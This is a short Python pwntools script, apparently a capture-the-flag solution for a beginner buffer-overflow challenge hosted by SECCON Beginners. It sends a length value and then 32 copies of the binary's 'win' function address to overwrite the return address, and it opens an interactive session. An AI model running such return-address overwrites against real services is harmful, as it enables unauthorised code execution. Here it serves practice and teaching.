from pwn import *
from ctftools.pwn.common import connect

exe = ELF("chall")
io = connect(exe, "beginnersbof.quals.beginners.seccon.jp", 9000)

io.sendline(b"128")
io.sendline(pack(exe.symbols.win) * 32)
io.interactive()
